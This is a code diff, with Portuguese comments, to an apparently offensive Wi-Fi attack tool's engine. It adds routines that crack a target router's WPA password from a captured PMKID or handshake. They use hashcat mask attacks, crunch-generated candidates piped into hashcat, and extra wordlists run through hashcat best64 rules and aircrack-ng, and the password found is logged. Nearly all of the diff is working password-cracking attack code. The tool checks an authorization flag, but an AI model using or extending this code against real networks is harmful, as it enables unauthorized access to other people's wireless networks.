@@ -65,6 +65,7 @@ class Engine:
         self.alvos = []          # lista de dicts do último scan
         self.target = {}         # alvo escolhido: essid/bssid/ch/enc/freq
         self.senha = None
+        self._mask = None        # máscara da Rota A, reaproveitada pela Rota D (PMKID)
         self.rota_usada = None
         self.ip_roteador = None
         self.autorizado = False
@@ -569,6 +570,71 @@ class Engine:
         self.log("Rota WPS não teve sucesso.")
         return False
 
+    def _crack_hc22000_com_mascara(self, hashfile, mask):
+        """Quebra um .hc22000 usando a máscara da Rota A (dict). Retorna a
+        senha ou None. Usada pela Rota D (PMKID) para quebrar sem handshake.
+        Usa GPU; repete com --force se nenhum dispositivo for detectado."""
+        if not mask or not _tool_existe("hashcat"):
+            return None
+        found = WORKDIR / "pmkid_mask_found_gui.txt"
+        found.unlink(missing_ok=True)
+
+        if mask.get("hashcat"):
+            def _rodar(forcar):
+                base = ["hashcat", "-m", "22000", str(hashfile), "-a", "3"]
+                if mask.get("custom"):
+                    base += ["-1", mask["custom"]]
+                if forcar:
+                    base += ["--force"]
+                base += [mask["hashcat"], "--potfile-disable", "-o", str(found)]
+                return self.run(base, timeout=3600)
+
+            r = _rodar(False)
+            saida = (r.stdout or "") + (r.stderr or "")
+            if (not found.exists() or found.stat().st_size == 0) and re.search(
+                r"no devices? (found|left)", saida, re.I
+            ):
+                _rodar(True)
+        else:
+            # crunch: máscara completa {mascara} ou guiada {tamanho,prefixo,tipo}
+            if mask.get("mascara"):
+                m = mask["mascara"]
+                tam = len(m.replace("\\", ""))
+            else:
+                tam = mask.get("tamanho")
+                if tam is None:
+                    return None
+                restante = tam - len(mask.get("prefixo", ""))
+                if restante < 0:
+                    return None
+                m = mask.get("prefixo", "") + mask.get("tipo", "") * restante
+
+            def _rodar_crunch(forcar):
+                base = ["hashcat", "-m", "22000", str(hashfile)]
+                if forcar:
+                    base += ["--force"]
+                base += ["--potfile-disable", "-o", str(found)]
+                crunch = subprocess.Popen(
+                    ["crunch", str(tam), str(tam), "-t", m], stdout=subprocess.PIPE
+                )
+                r = subprocess.run(base, stdin=crunch.stdout, capture_output=True, text=True)
+                crunch.stdout.close()
+                crunch.wait()
+                return r
+
+            r = _rodar_crunch(False)
+            saida = (r.stdout or "") + (r.stderr or "")
+            if (not found.exists() or found.stat().st_size == 0) and re.search(
+                r"no devices? (found|left)", saida, re.I
+            ):
+                _rodar_crunch(True)
+
+        if found.exists() and found.stat().st_size > 0:
+            linhas = found.read_text().strip().splitlines()
+            if linhas:
+                return linhas[-1].split(":", 1)[-1]
+        return None
+
     def rota_pmkid(self):
         self.log("--- Rota D: PMKID (ataque direto ao roteador, sem precisar de cliente) ---")
         self.garantir_moniface_viva()
@@ -643,6 +709,18 @@ class Engine:
             self.log("O roteador não respondeu com PMKID (comum em APs com WPA3/PMF). Rota D sem sucesso.")
             return False
 
+        # Se o usuário informou uma máscara na Rota A, tenta ela no PMKID primeiro
+        # — assim dá pra quebrar SEM depender de cliente conectado (handshake).
+        if self._mask:
+            self.log("PMKID capturado! Tentando quebrar com a máscara informada...")
+            senha = self._crack_hc22000_com_mascara(pmkid_hash, self._mask)
+            if senha:
+                self.senha = senha
+                self.rota_usada = "PMKID + máscara"
+                self.log(f"Senha encontrada via PMKID + máscara: {self.senha}")
+                return True
+            self.log("Máscara não quebrou o PMKID. Tentando rockyou...")
+
         if not ROCKYOU.exists() or ROCKYOU.stat().st_size == 0:
             self.log("Wordlist rockyou.txt não disponível. Não é possível quebrar o PMKID capturado.")
             return False
@@ -707,6 +785,33 @@ class Engine:
             self.log(f"Senha encontrada via aircrack-ng: {self.senha}")
             return True
 
+        # Wordlists extras colocadas em wordlists/ (ex.: senhas BR), além do rockyou.
+        for wl in sorted(WORDLIST_DIR.glob("*.txt")):
+            if wl.resolve() == ROCKYOU.resolve():
+                continue
+            self.log(f"Tentando wordlist extra: {wl.name}...")
+            if hashfile.exists() and hashfile.stat().st_size > 0 and _tool_existe("hashcat"):
+                found_file = WORKDIR / "hashcat_extra_gui.txt"
+                found_file.unlink(missing_ok=True)
+                self.run([
+                    "hashcat", "-m", "22000", str(hashfile), str(wl),
+                    "-r", "/usr/share/hashcat/rules/best64.rule",
+                    "--potfile-disable", "-o", str(found_file),
+                ], timeout=1800)
+                if found_file.exists() and found_file.stat().st_size > 0:
+                    linha = found_file.read_text().strip().splitlines()[-1]
+                    self.senha = linha.split(":", 1)[-1]
+                    self.rota_usada = f"Dicionário ({wl.name} + best64)"
+                    self.log(f"Senha encontrada via hashcat (wordlist extra): {self.senha}")
+                    return True
+            r2 = self.run(["aircrack-ng", "-w", str(wl), "-b", self.target["bssid"], str(cap)], timeout=1800)
+            m2 = re.search(r"KEY FOUND!\s*\[\s*(.*?)\s*\]", r2.stdout)
+            if m2:
+                self.senha = m2.group(1)
+                self.rota_usada = f"Dicionário ({wl.name})"
+                self.log(f"Senha encontrada via aircrack-ng (wordlist extra): {self.senha}")
+                return True
+
         self.log("Senha não encontrada no dicionário rockyou.txt + regras best64.")
         self.log("Isso sugere senha forte (fora de listas comuns de senhas vazadas).")
         return False
@@ -720,6 +825,8 @@ class Engine:
         a Rota A primeiro. Senão, segue direto WPS -> PMKID -> Dicionário."""
         if not self.autorizado:
             raise RuntimeError("Autorização não confirmada. Abortando antes de qualquer ataque.")
+
+        self._mask = mascara  # guarda p/ a Rota D (PMKID) reusar se a Rota A falhar
 
         try:
             if mascara:
